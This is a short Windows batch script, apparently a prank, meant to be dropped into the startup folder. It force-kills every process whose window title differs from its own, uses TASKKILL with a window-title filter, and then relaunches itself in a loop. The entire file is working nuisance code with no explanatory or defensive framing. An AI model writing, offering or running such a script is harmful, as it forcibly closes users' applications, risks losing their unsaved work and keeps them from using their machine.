@ECHO OFF
::I will never give up batch!
::Manually put into the startup folder.
TITLE winStat
TASKKILL /F /FI "WINDOWTITLE ne winStat"
TITLE HA!
TASKKILL /F /FI "WINDOWTITLE ne HA!"
start winStat.bat
